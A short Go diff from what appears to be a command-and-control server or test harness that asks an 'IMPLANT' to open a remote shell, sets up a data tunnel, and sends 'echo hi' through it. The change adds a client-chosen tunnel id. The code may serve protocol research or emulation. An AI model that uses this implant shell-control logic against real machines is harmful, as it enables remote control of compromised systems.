@@ -476,12 +476,15 @@ func handle(conn net.Conn, clientPub ed25519.PublicKey, serverPriv ed25519.Priva
 		fmt.Printf("IMPLANT REPLY ok: type=%d id=%d unknown-type=%d\n", v[2], v[1], v[4])
 	}
 	// Shell: ShellReq(20) -> Shell(21){Pid, TunnelID}, then TunnelData(22) both ways.
-	if _, shBody, err := rpcCall(sess, serverPriv, serverPub, clientPub, 52, 20, protoStr(1, cmdExe), 21); err != nil {
+	clientTunnel := uint64(0xAABBCCDD)
+	shReq := append(protoStr(1, cmdExe), appendUvarint(nil, 8<<3)...)
+	shReq = appendUvarint(shReq, clientTunnel)
+	if _, shBody, err := rpcCall(sess, serverPriv, serverPub, clientPub, 52, 20, shReq, 21); err != nil {
 		log.Printf("shell failed: %v", err)
 	} else {
 		sv, _ := envelopeFields(shBody[3])
 		tunnel := sv[8]
-		fmt.Printf("SHELL ok: pid=%d tunnel=%d\n", sv[3], tunnel)
+		fmt.Printf("SHELL ok: pid=%d tunnel=%d (client asked %d)\n", sv[3], tunnel, clientTunnel)
 		stdin := append(protoStrBytes(1, []byte("echo hi\r\n")), appendUvarint(nil, 8<<3)...)
 		stdin = appendUvarint(stdin, tunnel)
 		env := makeEnvelope(53, 22, stdin)
@@ -732,6 +735,7 @@ func makeEnvelope(id, typ uint64, payload []byte) []byte {
 	}
 	return env
 }
+
 
 
 
